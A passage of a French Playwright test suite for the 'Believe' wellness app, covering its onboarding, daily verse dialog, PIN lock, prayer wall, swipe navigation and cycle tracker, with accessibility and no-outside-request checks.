/** Contrôle d'accessibilité dans les trois thèmes (clair, sombre, OLED) : le thème est posé comme le fait le réglage de l'application, puis retiré. */
const themed = async (p, name) => { for (const t of ['light', 'dark', 'oled']) { await p.evaluate(x => document.documentElement.setAttribute('data-theme', x), t); await wait(220); await axe(p, name + '/' + t) } await p.evaluate(() => document.documentElement.removeAttribute('data-theme')) }
const flat = p => p.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)
const store = p => p.evaluate(() => JSON.parse(localStorage.getItem('believe:v2')))
const dayIn = (p, n) => p.evaluate(n => { const x = new Date(); x.setDate(x.getDate() + n); return x.getFullYear() + '-' + String(x.getMonth() + 1).padStart(2, '0') + '-' + String(x.getDate()).padStart(2, '0') }, n)
/** Verset affiché dans une fenêtre ou une section : texte entre « » et ligne « référence, traduction ». */
const shown = async scope => ({ text: (await scope.locator('.q').first().textContent()).slice(2, -2), ref: await scope.locator('.q + p.mut').first().textContent() })
const ofList = (list, s) => { const v = list.find(x => x[1] === s.text); return !!v && s.ref === v[0] + ', ' + VERSES.trLabel(v) }

const F = await mk({ serviceWorkers: 'block' }), pf = F.page, reqF = []
await F.ctx.addInitScript(spies)
pf.on('request', r => { if (!/^data:|^blob:/.test(r.url())) reqF.push(r.url()) })

await T('Accueil guidé (Chromium réel) : trois étapes au premier lancement, accessibilité (clair, sombre, OLED), aucun débordement, objectif dangereux refusé, profil enregistré, aucune requête', async () => {
  await pf.goto(URL0 + '#/4'); await pf.waitForSelector('h1:has-text("Bienvenue dans Believe")')
  eq(await pf.getByRole('navigation', { name: 'Navigation principale' }).count(), 0, 'barre de navigation pendant l’accueil guidé')
  eq(await pf.getByRole('button', { name: 'Actions rapides' }).count(), 0, 'bouton + pendant l’accueil guidé')
  eq(await pf.evaluate(() => document.activeElement?.id), 'onb-t', 'le titre devrait avoir le focus')
  yes(await flat(pf), 'débordement horizontal (étape 1)'); await themed(pf, 'accueil/étape 1'); await shot(pf, 'accueil-guide-1')
  eq((await store(pf)).profile, null, 'profil créé avant toute saisie')
  await pf.getByRole('button', { name: 'Commencer' }).click(); await pf.waitForSelector('h1:has-text("Faisons connaissance")')
  eq(await pf.evaluate(() => document.activeElement?.id), 'onb-t', 'focus non rendu au titre de l’étape 2')
  await pf.getByRole('button', { name: 'Enregistrer et continuer' }).click(); await pf.getByText('Choisissez Femme ou Homme.').waitFor()
  yes(await flat(pf), 'débordement horizontal (étape 2)'); await themed(pf, 'accueil/étape 2 avec erreur'); await shot(pf, 'accueil-guide-2')
  await pf.getByRole('radio', { name: 'Femme' }).check(); await pf.getByLabel('Prénom', { exact: true }).fill('Ada'); await pf.getByLabel('Âge', { exact: true }).fill('34'); await pf.getByLabel('Taille (cm)', { exact: true }).fill('168')
  await pf.getByLabel('Poids de départ (kg)', { exact: true }).fill('72,5'); await pf.getByLabel('Poids actuel (kg)', { exact: true }).fill('68'); await pf.getByLabel('Poids cible (kg)', { exact: true }).fill('40')
  await pf.getByLabel('Sexe utilisé dans les formules de santé', { exact: true }).selectOption('F')
  await pf.getByRole('button', { name: 'Enregistrer et continuer' }).click(); await pf.getByText(/Objectif refusé/).waitFor()
  eq(await pf.locator('h1').textContent(), 'Faisons connaissance'); eq((await store(pf)).profile, null, 'profil enregistré malgré l’objectif dangereux')
  await pf.getByLabel('Poids cible (kg)', { exact: true }).fill('60'); await pf.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  await pf.waitForSelector('h1:has-text("Ada, tout est prêt")')
  const s = await store(pf); eq([s.profile.name, s.profile.g, s.profile.sx, s.profile.ws, s.profile.w, s.profile.t], ['Ada', 'F', 'F', 72.5, 68, 60]); eq(s.ui.onboard, false, 'accueil marqué terminé avant la dernière étape')
  yes(await pf.getByText(/Vous êtes prête : voici votre premier verset/).isVisible(), 'accord au féminin absent')
  yes(await flat(pf), 'débordement horizontal (étape 3)'); await themed(pf, 'accueil/étape 3'); await shot(pf, 'accueil-guide-3')
  eq(reqF.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqF.filter(u => /\/api\//.test(u)), [], 'appel à une fonction serveur')
})

await T('Verset du jour (Chromium réel) : fenêtre à la fin de l’accueil, verset de la liste Femme avec référence et traduction, focus piégé, « Écouter » lit le verset, « Nouveau verset » parcourt les 28, Échap ferme, rien le même jour', async () => {
  await pf.getByRole('button', { name: 'Voir mon verset du jour' }).click()
  const d = pf.getByRole('dialog', { name: 'Verset du jour' }); await d.waitFor(); await wait(400); await shot(pf, 'verset-fenetre')
  eq((await store(pf)).ui.onboard, true, 'accueil non marqué terminé')
  const s0 = await shown(d); yes(ofList(VERSES.VF, s0), 'verset hors de la liste Femme ou référence inexacte : ' + JSON.stringify(s0))
  const inside = () => d.evaluate(el => el.contains(document.activeElement))
  yes(await inside(), 'focus hors de la fenêtre à l’ouverture')
  for (let i = 0; i < 7; i++) { await pf.keyboard.press('Tab'); yes(await inside(), 'le focus est sorti de la fenêtre au Tab n° ' + (i + 1)) }
  for (let i = 0; i < 7; i++) { await pf.keyboard.press('Shift+Tab'); yes(await inside(), 'le focus est sorti de la fenêtre au Maj+Tab n° ' + (i + 1)) }
  await d.getByRole('button', { name: 'Écouter' }).click()
  const said = await pf.evaluate(() => window.__said), v0 = VERSES.VF.find(x => x[1] === s0.text)
  eq(said.length, 1, 'une seule lecture attendue'); eq(said[0].lang, 'fr-FR'); eq(said[0].text, v0[1] + ' ' + VERSES.refSpoken(v0[0]), 'texte lu à voix haute')
  const seen = [s0.text]
  for (let i = 1; i < VERSES.VF.length; i++) { await d.getByRole('button', { name: 'Nouveau verset' }).click(); await wait(40); const s = await shown(d); yes(ofList(VERSES.VF, s), 'verset hors liste : ' + JSON.stringify(s)); seen.push(s.text) }
  eq(new Set(seen).size, VERSES.VF.length, 'verset répété avant la fin de la liste')
  await d.getByRole('button', { name: 'Nouveau verset' }).click(); await wait(40); eq((await shown(d)).text, s0.text, 'la liste ne recommence pas au premier verset')
  await d.getByRole('button', { name: 'Nouveau verset' }).click(); await wait(40); const last = await shown(d)
  await pf.keyboard.press('Escape'); await d.waitFor({ state: 'detached' })
  eq((await store(pf)).ui.verseDay, await dayIn(pf, 0), 'jour du verset non enregistré')
  const banner = pf.locator('section[aria-label="Verset du jour"]'); eq(await shown(banner), last, 'la bannière ne montre pas le verset choisi')
  await pf.reload(); await pf.waitForSelector('h1:has-text("Bonjour Ada")'); await wait(400)
  eq(await pf.getByRole('dialog', { name: 'Verset du jour' }).count(), 0, 'fenêtre revenue après rechargement le même jour'); eq(await shown(banner), last, 'verset choisi non conservé après rechargement')
})

await T('Verset du jour et PIN (Chromium réel) : jamais derrière l’écran de verrouillage, une seule fois par jour, de nouveau le lendemain après le PIN, et au retour au premier plan un autre jour', async () => {
  await pf.goto(URL0 + '#/5/confidentialite'); await pf.reload(); await pf.waitForSelector('h2:has-text("Code PIN")')
  await pf.getByLabel('Nouveau PIN', { exact: true }).fill('4821'); await pf.getByLabel('Confirmer le PIN', { exact: true }).fill('4821'); await pf.getByRole('button', { name: 'Activer le PIN' }).click(); await pf.getByText(/PIN activé/).waitFor()
  const locked = () => pf.getByRole('heading', { name: 'Saisissez votre PIN' }), verse = () => pf.getByRole('dialog', { name: 'Verset du jour' })
  // même jour : verrouillé à la réouverture, aucune fenêtre ni donnée personnelle derrière l'écran, aucune fenêtre après le PIN (déjà vue aujourd'hui)
  await pf.reload(); await locked().waitFor(); eq(await verse().count(), 0, 'fenêtre du verset derrière l’écran de verrouillage')
  eq(await pf.evaluate(() => /Ada|Bonjour|Louis Segond/.test(document.body.innerText)), false, 'donnée personnelle ou verset visible derrière le verrouillage')
  await pf.keyboard.type('4821'); await locked().waitFor({ state: 'detached' }); await wait(500)
  eq(await verse().count(), 0, 'fenêtre revenue le même jour après le PIN')
  // lendemain (36 h plus tard, quelle que soit l'heure) : verrouillé et aucune fenêtre ; après le PIN la fenêtre s'ouvre ; Échap la ferme et le jour est enregistré
  await pf.clock.setFixedTime(new Date(Date.now() + 36 * 3600e3)); await pf.reload(); await locked().waitFor(); eq(await verse().count(), 0, 'fenêtre du verset derrière l’écran de verrouillage (lendemain)')
  await pf.keyboard.type('4821'); await verse().waitFor(); yes(ofList(VERSES.VF, await shown(verse())), 'verset hors liste après le PIN')
  const before = (await store(pf)).ui.verseDay; await pf.keyboard.press('Escape'); await verse().waitFor({ state: 'detached' })
  const after = (await store(pf)).ui.verseDay; yes(before !== after && after === await dayIn(pf, 0), 'jour du verset non mis à jour : ' + before + ' → ' + after)
  // retour au premier plan un autre jour (application déjà déverrouillée) : la fenêtre s'ouvre ; une deuxième fois le même jour : non
  await pf.clock.setFixedTime(new Date(Date.now() + 72 * 3600e3)); await pf.evaluate(() => document.dispatchEvent(new Event('visibilitychange'))); await verse().waitFor()
  await verse().getByRole('button', { name: 'Continuer' }).click(); await verse().waitFor({ state: 'detached' })
  await pf.evaluate(() => document.dispatchEvent(new Event('visibilitychange'))); await wait(500); eq(await verse().count(), 0, 'fenêtre rouverte le même jour')
})

const G = await mk({ serviceWorkers: 'block' }), pg = G.page, reqG = []
await G.ctx.addInitScript(spies)
pg.on('request', r => { if (!/^data:|^blob:/.test(r.url())) reqG.push(r.url()) })
await pg.goto(URL0 + '#/4'); await pg.waitForSelector('h1'); await pg.evaluate(ONBOARDED)
await pg.evaluate(() => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.profile = { g: 'F', name: 'Ada', age: 34, h: 168, w: 68, t: 60, ws: 72, lv: 'I', sx: 'F' }; localStorage.setItem('believe:v2', JSON.stringify(s)) })
const wall = async () => { await pg.goto(URL0 + '#/4/prieres'); await pg.reload(); await pg.waitForSelector('h2:has-text("Mur de prières et gratitudes")'); await wait(700) }

await T('Mur de prières (Chromium réel) : champ prêt à écrire, ajout, exaucée avec date modifiable (bornes), modification, gratitude, suppression confirmée, texte très long sans débordement, accessibilité, rien d’envoyé', async () => {
  await wall()
  eq(await pg.evaluate(() => document.activeElement?.id), 'pnew', 'champ non actif')
  yes(await pg.evaluate(() => { const r = document.getElementById('pnew').getBoundingClientRect(); return r.top >= 0 && r.bottom <= innerHeight }), 'champ hors de l’écran')
  eq(await pg.getByText(/Le mur est vide/).count(), 1)
  await pg.getByRole('button', { name: 'Ajouter au mur' }).click(); await pg.getByText('Écrivez d’abord un sujet.').waitFor(); eq((await store(pg)).prayers.length, 0)
  await pg.getByLabel('Sujet de prière', { exact: true }).fill('Pour la guérison de ma sœur'); await pg.getByRole('button', { name: 'Ajouter au mur' }).click(); await pg.getByText('Sujet de prière ajouté au mur.').waitFor()
  let s = await store(pg); eq([s.prayers.length, s.prayers[0].t, s.prayers[0].a, s.prayers[0].c], [1, 'Pour la guérison de ma sœur', null, await dayIn(pg, 0)])
  // ancien sujet semé (créé il y a 10 jours) pour éprouver les bornes de la date d'exaucement
  await pg.evaluate(c => { const x = JSON.parse(localStorage.getItem('believe:v2')); x.prayers.push({ id: 'p-old', t: 'Un ancien sujet', c, a: null }); localStorage.setItem('believe:v2', JSON.stringify(x)) }, await dayIn(pg, -10)); await pg.reload()
  await pg.waitForSelector('h3:has-text("Prières en cours (2)")')
  await pg.getByLabel('Exaucée : Un ancien sujet', { exact: true }).check(); await pg.waitForSelector('h3:has-text("Prières exaucées (1)")')
  const dt = pg.getByLabel('Date d’exaucement : Un ancien sujet', { exact: true }), d0 = await dayIn(pg, 0), d5 = await dayIn(pg, -5)
  eq(await dt.inputValue(), d0, 'date proposée = aujourd’hui'); await dt.fill(d5); await wait(150)
  eq((await store(pg)).prayers.find(p => p.id === 'p-old').a, d5, 'date valide non enregistrée'); eq(await pg.locator('time[datetime="' + d5 + '"]').count() >= 1, true, 'date affichée')
  for (const [n, why] of [[-11, 'avant la création'], [1, 'dans le futur']]) {
    await dt.fill(await dayIn(pg, n)); await pg.getByRole('alert').filter({ hasText: 'Date d’exaucement : entre le' }).waitFor(); eq((await store(pg)).prayers.find(p => p.id === 'p-old').a, d5, 'date ' + why + ' acceptée')
    await dt.fill(d5); await wait(100)
  }
  await pg.getByLabel('Exaucée : Un ancien sujet', { exact: true }).uncheck(); await pg.waitForSelector('h3:has-text("Prières en cours (2)")'); eq((await store(pg)).prayers.find(p => p.id === 'p-old').a, null, 'case décochée sans effet')
  await pg.getByLabel('Exaucée : Un ancien sujet', { exact: true }).check(); await pg.waitForSelector('h3:has-text("Prières exaucées (1)")'); eq((await store(pg)).prayers.find(p => p.id === 'p-old').a, d0)
  // modification du texte
  await pg.getByRole('button', { name: 'Modifier : Pour la guérison de ma sœur' }).click(); await pg.getByLabel('Modifier le sujet', { exact: true }).fill('Pour la guérison de ma sœur et la paix de ma famille')
  await pg.getByRole('button', { name: 'Enregistrer', exact: true }).click(); await pg.getByText('Pour la guérison de ma sœur et la paix de ma famille').waitFor()
  eq((await store(pg)).prayers[0].t, 'Pour la guérison de ma sœur et la paix de ma famille')
  // gratitude : pas de case « Exaucée »
  await pg.getByRole('radio', { name: 'Gratitude' }).check(); await pg.getByLabel('Motif de gratitude', { exact: true }).fill('Merci pour cette journée'); await pg.getByRole('button', { name: 'Ajouter au mur' }).click(); await pg.getByText('Gratitude ajoutée au mur.').waitFor()
  await pg.waitForSelector('h3:has-text("Gratitudes (1)")'); eq(await pg.getByLabel('Exaucée : Merci pour cette journée', { exact: true }).count(), 0, 'case Exaucée sur une gratitude'); eq((await store(pg)).prayers.at(-1).k, 'g')
  // texte très long, sans espace : le mur ne déborde pas
  await pg.getByRole('radio', { name: 'Prière' }).check(); await pg.getByLabel('Sujet de prière', { exact: true }).fill('A'.repeat(480)); await pg.getByRole('button', { name: 'Ajouter au mur' }).click(); await pg.getByText('Sujet de prière ajouté au mur.').waitFor()
  yes(await flat(pg), 'débordement horizontal avec un texte très long'); await wait(200); await themed(pg, 'mur-de-prières'); await shot(pg, 'mur-de-prieres')
  // suppression avec confirmation
  const n0 = (await store(pg)).prayers.length, longLbl = 'Supprimer : ' + 'A'.repeat(57) + '…'
  await pg.getByRole('button', { name: longLbl, exact: true }).click(); await pg.getByRole('group', { name: longLbl }).getByRole('button', { name: 'Annuler' }).click(); eq((await store(pg)).prayers.length, n0, 'suppression sans confirmation')
  await pg.getByRole('button', { name: longLbl, exact: true }).click(); await pg.getByRole('button', { name: 'Oui, supprimer' }).click(); await pg.waitForFunction(n => JSON.parse(localStorage.getItem('believe:v2')).prayers.length === n - 1, n0)
  await pg.reload(); await pg.waitForSelector('h2:has-text("Mur de prières et gratitudes")'); const fin = (await store(pg)).prayers; eq(fin.map(p => p.t).sort(), ['Merci pour cette journée', 'Pour la guérison de ma sœur et la paix de ma famille', 'Un ancien sujet'].sort(), 'état final après rechargement')
  eq(reqG.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqG.filter(u => /\/api\//.test(u)), [], 'appel à une fonction serveur')
})

await T('Accueil (Chromium réel) : le mur de prières vient après le verset du jour, indicateurs du jour visibles, aucun débordement', async () => {
  await pg.goto(URL0 + '#/4'); await pg.reload(); await pg.waitForSelector('h1:has-text("Bonjour Ada")'); await wait(400)
  yes(await pg.evaluate(() => { const a = document.querySelector('section[aria-label="Verset du jour"]'), b = document.querySelector('section[aria-label="Mur de prières et gratitudes"]'); return !!a && !!b && !!(a.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING) }), 'ordre verset puis mur')
  yes(await flat(pg), 'débordement horizontal'); yes(await pg.getByText('Prête pour aujourd’hui ?').isVisible(), 'accord Prête'); await themed(pg, 'accueil'); await shot(pg, 'accueil-clair')
  await pg.evaluate(() => document.documentElement.setAttribute('data-theme', 'dark')); await wait(250); await shot(pg, 'accueil-sombre'); await pg.evaluate(() => document.documentElement.removeAttribute('data-theme'))
})

await T('Balayage tactile des sections (Chromium réel) : Accueil → Habitudes → IA → Rubriques, une vibration par changement et aucune au bout, gestes ignorés (champ, bande des indicateurs, trop vertical), boutons du bas toujours présents, réglage haptique respecté', async () => {
  await pg.goto(URL0 + '#/4'); await pg.reload(); await pg.waitForSelector('h1:has-text("Bonjour Ada")'); await wait(500)
  const nv = () => pg.evaluate(() => window.__vib.length), at = () => pg.evaluate(() => location.hash)
  const left = async () => { const { y, w } = await swipeArea(pg, 'main h1'); await swipe(pg, w - 40, y, 40, y); await wait(500) }
  const right = async () => { const { y, w } = await swipeArea(pg, 'main h1'); await swipe(pg, 40, y, w - 40, y); await wait(500) }
  eq(await at(), '#/4'); await left(); eq(await at(), '#/6'); await left(); eq(await at(), '#/3'); await left(); eq(await at(), '#/menu')
  eq(await pg.evaluate(() => window.__vib), [10, 10, 10], 'vibrations demandées'); await left(); eq(await at(), '#/menu'); eq(await nv(), 3, 'vibration au bout de la dernière section')
  await right(); eq(await at(), '#/3'); await right(); await right(); eq(await at(), '#/4'); await right(); eq(await at(), '#/4'); eq(await nv(), 6, 'vibrations au retour')
  const nav = pg.getByRole('navigation', { name: 'Navigation principale' }); eq(await nav.getByRole('link').allTextContents().then(a => a.map(t => t.slice(1))), ['Accueil', 'Habitudes', 'IA', 'Rubriques'], 'boutons du bas'); yes(await pg.getByRole('button', { name: 'Actions rapides' }).isVisible())
  // gestes ignorés : départ sur un champ, sur la bande des indicateurs, geste trop vertical
  await wall(); const f = await pg.locator('#pnew').boundingBox(); await swipe(pg, f.x + f.width - 20, f.y + f.height / 2, f.x + 20, f.y + f.height / 2); await wait(500); eq(await at(), '#/4/prieres', 'balayage parti d’un champ')
  await pg.goto(URL0 + '#/4'); await pg.reload(); await pg.waitForSelector('.story'); await wait(400)
  const st = await pg.locator('.story').boundingBox(); await swipe(pg, 350, st.y + st.height / 2, 40, st.y + st.height / 2); await wait(500); eq(await at(), '#/4', 'balayage parti de la bande des indicateurs')
  const { y } = await swipeArea(pg, 'main h1'); await swipe(pg, 350, y, 40, y + 280); await wait(500); eq(await at(), '#/4', 'geste trop vertical'); eq(await nv(), 0, 'vibration pour un geste ignoré')
  // alternative visible : le bouton de la barre du bas
  await nav.getByRole('link', { name: /Rubriques/ }).click(); await pg.waitForSelector('h1:has-text("Rubriques")'); eq(await at(), '#/menu')
  // réglage « retour haptique » coupé dans la rubrique 5 : le balayage fonctionne sans vibrer
  await pg.goto(URL0 + '#/5/reglages'); await pg.reload(); await pg.getByLabel(/Retour haptique/).uncheck(); eq((await store(pg)).settings.haptics, false)
  await pg.goto(URL0 + '#/4'); await pg.reload(); await pg.waitForSelector('h1:has-text("Bonjour Ada")'); await wait(400); eq(await nv(), 0); await left(); eq(await at(), '#/6'); eq(await nv(), 0, 'vibration malgré le réglage coupé')
  await pg.goto(URL0 + '#/5/reglages'); await pg.reload(); await pg.getByLabel(/Retour haptique/).check(); eq((await store(pg)).settings.haptics, true)
})

await T('Transitions (Chromium réel) : « will-change » posé seulement pendant l’animation puis retiré, barre du bas et bouton + restent collés au bas de l’écran après défilement', async () => {
  await pg.goto(URL0 + '#/4'); await pg.reload(); await pg.waitForSelector('h1:has-text("Bonjour Ada")'); await wait(1000)
  eq(await pg.evaluate(() => getComputedStyle(document.querySelector('.view')).willChange), 'auto', 'will-change resté posé au repos')
  await pg.evaluate(() => { window.__wc = []; new MutationObserver(() => { const el = document.querySelector('.view.wc'); if (el) window.__wc.push(getComputedStyle(el).willChange) }).observe(document.body, { subtree: true, childList: true, attributes: true, attributeFilter: ['class'] }) })
  await pg.evaluate(() => { location.hash = '#/menu' }); await pg.waitForSelector('h1:has-text("Rubriques")'); await wait(1000)
  const wc = await pg.evaluate(() => window.__wc); yes(wc.length > 0 && wc.every(x => x === 'transform, opacity'), 'will-change absent pendant la transition : ' + JSON.stringify(wc))
  eq(await pg.evaluate(() => [document.querySelector('.view').className.includes('wc'), getComputedStyle(document.querySelector('.view')).willChange]), [false, 'auto'], 'will-change non retiré après la transition')
  await pg.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight)); await wait(300)
  const pos = await pg.evaluate(() => { const r = document.querySelector('nav[aria-label="Navigation principale"]').getBoundingClientRect(), b = document.querySelector('button[aria-label="Actions rapides"]').getBoundingClientRect(); return { sy: Math.round(scrollY), navBottom: Math.round(r.bottom), h: innerHeight, plusInside: b.top >= 0 && b.bottom <= innerHeight } })
  yes(pos.sy > 100, 'la page ne défile pas (test sans valeur) : ' + JSON.stringify(pos)); eq([pos.navBottom, pos.plusInside], [pos.h, true], 'barre du bas ou bouton + décrochés : ' + JSON.stringify(pos))
})

await T('Actions rapides (Chromium réel) : bouton + central, feuille du bas avec 8 actions, focus et Échap, « Ajouter une prière » mène au champ prêt à écrire, accessibilité sur trois thèmes', async () => {
  await pg.goto(URL0 + '#/6'); await pg.reload(); await pg.waitForSelector('h1:has-text("Habitudes")'); await wait(500)
  const plus = pg.getByRole('button', { name: 'Actions rapides' }); await plus.click()
  const sh = pg.getByRole('dialog', { name: 'Actions rapides' }); await sh.waitFor(); await wait(600)
  eq(await sh.locator('.qa a, .qa button').evaluateAll(els => els.map(e => e.textContent.slice(1))), ['Cocher une habitude', 'Nouvelle note', 'Enregistrer un audio', 'Nouvelle tâche', 'Ajouter une prière', 'Démarrer une séance', 'Demander à Believe AI', 'Eau et sommeil'])
  yes(await sh.evaluate(el => el.getBoundingClientRect().bottom <= innerHeight + 1 && el.getBoundingClientRect().top > 0), 'feuille hors de l’écran'); await themed(pg, 'feuille-actions-rapides'); await shot(pg, 'actions-rapides')
  await pg.keyboard.press('Escape'); await sh.waitFor({ state: 'detached' }); eq(await pg.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Actions rapides', 'focus non rendu au bouton +')
  await plus.click(); await sh.waitFor(); await sh.getByRole('link', { name: /Ajouter une prière/ }).click(); await sh.waitFor({ state: 'detached' }); await pg.waitForSelector('h2:has-text("Mur de prières et gratitudes")'); await wait(900)
  eq(await pg.evaluate(() => location.hash), '#/4/prieres'); eq(await pg.evaluate(() => document.activeElement?.id), 'pnew', 'champ de prière non prêt à écrire')
})

const H = await mk({ serviceWorkers: 'block', viewport: { width: 1100, height: 800 }, isMobile: false, hasTouch: false }), ph = H.page
await H.ctx.addInitScript(spies)
await T('Grand écran (Chromium réel) : accueil guidé, fenêtre du verset (liste complète sans profil), barre latérale, mur de prières — accessibilité sur trois thèmes, aucun débordement', async () => {
  await ph.goto(URL0 + '#/4'); await ph.waitForSelector('h1:has-text("Bienvenue dans Believe")'); yes(await flat(ph), 'débordement (accueil guidé)'); await themed(ph, 'accueil-grand-écran'); await shot(ph, 'accueil-guide-grand-ecran')
  await ph.getByRole('button', { name: 'Passer pour l’instant' }).click()
  const d = ph.getByRole('dialog', { name: 'Verset du jour' }); await d.waitFor(); yes(ofList([...VERSES.VF, ...VERSES.VM], await shown(d)), 'verset hors de la liste complète'); await wait(500); await themed(ph, 'verset-grand-écran'); await shot(ph, 'verset-grand-ecran')
  await d.getByRole('button', { name: 'Continuer' }).click(); await d.waitFor({ state: 'detached' })
  const box = await ph.getByRole('navigation', { name: 'Rubriques' }).boundingBox(); yes(box.x < 30 && box.width < 320 && box.height > 500, 'barre latérale attendue : ' + JSON.stringify(box)); eq(await ph.getByRole('navigation', { name: 'Navigation principale' }).count(), 0, 'barre du bas visible sur grand écran')
  await ph.goto(URL0 + '#/4/prieres'); await ph.reload(); await ph.waitForSelector('h2:has-text("Mur de prières et gratitudes")'); await wait(500)
  await ph.getByLabel('Sujet de prière', { exact: true }).fill('Pour la paix de ma maison'); await ph.getByRole('button', { name: 'Ajouter au mur' }).click(); await ph.getByText('Sujet de prière ajouté au mur.').waitFor()
  await ph.getByRole('radio', { name: 'Gratitude' }).check(); await ph.getByLabel('Motif de gratitude', { exact: true }).fill('Merci pour le repas partagé'); await ph.getByRole('button', { name: 'Ajouter au mur' }).click(); await ph.getByText('Gratitude ajoutée au mur.').waitFor()
  yes(await flat(ph), 'débordement (mur de prières)'); await themed(ph, 'mur-grand-écran'); await shot(ph, 'mur-de-prieres-grand-ecran')
})

// ---------------------------------------------------------------- rubrique 8 : suivi cycle ou récupération
const sante = async hash => { await pg.goto(URL0 + hash); await pg.reload(); await pg.waitForSelector('h1:has-text("Santé, scanner et recettes")'); await wait(500) }
/** Écrit directement l'état du suivi (accord Santé donné) puis recharge, pour éprouver l'affichage de séries déjà remplies. */
const seedSuivi = (cy, extra = {}) => pg.evaluate(({ cy, extra }) => {
  const iso = n => { const x = new Date(); x.setDate(x.getDate() + n); return x.getFullYear() + '-' + String(x.getMonth() + 1).padStart(2, '0') + '-' + String(x.getDate()).padStart(2, '0') }
  const s = JSON.parse(localStorage.getItem('believe:v2')); s.consents.health = true
  const en = {}; for (const [n, v] of cy.en ?? []) en[iso(n)] = v
  const rec = {}; for (const [n, v] of cy.rec ?? []) rec[iso(n)] = v
  s.cycle = { mode: cy.mode, starts: (cy.starts ?? []).map(iso), rec, en }; Object.assign(s, extra); localStorage.setItem('believe:v2', JSON.stringify(s))
}, { cy, extra })
const sport = async hash => { await pg.goto(URL0 + hash); await pg.reload(); await pg.waitForSelector('h1:has-text("Sport, GPS et podomètre")'); await wait(500) }
const rateG = (name, n) => pg.getByRole('group', { name, exact: true }).getByRole('radio', { name: String(n), exact: true }).check()

await T('Suivi du cycle (Chromium réel) : onglet, choix du suivi, début des règles, énergie (souris et clavier), cibles tactiles, retrait confirmé, effacement, mode discret, accessibilité sur trois thèmes, rien d’envoyé', async () => {
  await seedSuivi({ mode: 'off' }); await sante('#/8/suivi')
  eq(await pg.getByRole('button', { name: 'Cycle / récupération', exact: true }).getAttribute('aria-pressed'), 'true', 'onglet non sélectionné par l’adresse')
  eq(await pg.getByRole('radio', { name: 'Désactivé' }).isChecked(), true); yes(await flat(pg), 'débordement (suivi désactivé)'); await themed(pg, 'suivi-désactivé')
  await pg.getByRole('radio', { name: 'Cycle hormonal et énergie' }).check(); await pg.getByText('Suivi du cycle activé.').waitFor(); eq((await store(pg)).cycle.mode, 'cycle')
  const d12 = await dayIn(pg, -12), d0 = await dayIn(pg, 0), d1 = await dayIn(pg, 1)
  eq(await pg.getByLabel('Premier jour des règles').getAttribute('max'), d0, 'le sélecteur de date doit refuser les jours futurs')
  await pg.getByLabel('Premier jour des règles').fill(d1); await pg.getByRole('button', { name: 'Enregistrer le début des règles' }).click(); await pg.getByRole('alert').filter({ hasText: 'ne peut pas être dans le futur' }).waitFor(); eq((await store(pg)).cycle.starts, [])
  await pg.getByLabel('Premier jour des règles').fill(d12); await pg.getByRole('button', { name: 'Enregistrer le début des règles' }).click(); await pg.getByText(/Début des règles enregistré/).waitFor()
  eq((await store(pg)).cycle.starts, [d12]); await pg.getByText('Jour 13 du cycle', { exact: true }).waitFor()
  // énergie : souris puis clavier (flèche droite dans le groupe de boutons radio)
  await rateG('Énergie ressentie', 4); await pg.getByText('Énergie enregistrée : 4 sur 5, aujourd’hui.').waitFor(); eq((await store(pg)).cycle.en[d0], 4)
  await pg.getByRole('group', { name: 'Énergie ressentie' }).getByRole('radio', { name: '4', exact: true }).focus(); await pg.keyboard.press('ArrowRight'); await pg.getByText('Énergie enregistrée : 5 sur 5, aujourd’hui.').waitFor(); eq((await store(pg)).cycle.en[d0], 5)
  // cibles tactiles d'au moins 44 px (WCAG 2.5.5) pour les notes de 1 à 5
  const sizes = await pg.getByRole('group', { name: 'Énergie ressentie' }).locator('label').evaluateAll(ls => ls.map(l => { const r = l.getBoundingClientRect(); return [Math.round(r.width), Math.round(r.height)] }))
  yes(sizes.length === 5 && sizes.every(([w, h]) => w >= 44 && h >= 44), 'cibles tactiles trop petites : ' + JSON.stringify(sizes))
  // série déjà remplie : trois débuts de règles, énergie sur 20 jours
  await seedSuivi({ mode: 'cycle', starts: [-68, -40, -12], en: Array.from({ length: 20 }, (_, i) => [-i, 1 + ((i * 7) % 5)]) }); await sante('#/8/suivi')
  await pg.getByText(/Durée de cycle retenue : 28 jours \(moyenne de vos 2 derniers cycles\)/).waitFor(); eq(await pg.getByRole('img', { name: /Énergie des 28 derniers jours : 20 jours notés, moyenne/ }).count(), 1)
  yes(await pg.getByRole('heading', { name: 'Énergie moyenne par phase' }).isVisible(), 'moyennes par phase'); yes(await flat(pg), 'débordement (suivi du cycle, 390 px)'); await wait(250); await shot(pg, 'suivi-cycle')
  await pg.setViewportSize({ width: 320, height: 640 }); await wait(300); yes(await flat(pg), 'débordement (suivi du cycle, 320 px)'); await pg.setViewportSize({ width: 390, height: 844 }); await wait(300)
  await themed(pg, 'suivi-cycle'); await pg.evaluate(() => document.documentElement.setAttribute('data-theme', 'dark')); await wait(250); await shot(pg, 'suivi-cycle-sombre'); await pg.evaluate(() => document.documentElement.removeAttribute('data-theme'))
  // retrait d'une date : confirmation d'abord
  await pg.getByRole('button', { name: /^Retirer la date du/ }).first().click(); await pg.getByRole('group', { name: /^Retirer :/ }).getByRole('button', { name: 'Annuler' }).click(); eq((await store(pg)).cycle.starts.length, 3, 'retrait sans confirmation')
  await pg.getByRole('button', { name: /^Retirer la date du/ }).first().click(); await pg.getByRole('button', { name: 'Oui, retirer' }).click(); await pg.getByText(/Date retirée/).waitFor(); eq((await store(pg)).cycle.starts, [await dayIn(pg, -68), await dayIn(pg, -40)])
  eq(await pg.evaluate(() => document.activeElement?.textContent), 'Où en êtes-vous ?', 'focus non rendu au titre après le retrait')
  // mode discret : les données du suivi sont floutées
  await seedSuivi({ mode: 'cycle', starts: [-12], en: [[0, 4]] }, { discret: true }); await sante('#/8/suivi')
  yes(/blur/.test(await pg.locator('.suivi .card.sens').evaluate(e => getComputedStyle(e).filter)), 'carte du cycle non floutée en mode discret'); yes(/blur/.test(await pg.getByRole('img', { name: /Énergie des 28 derniers jours/ }).evaluate(e => getComputedStyle(e).filter)), 'graphique non flouté')
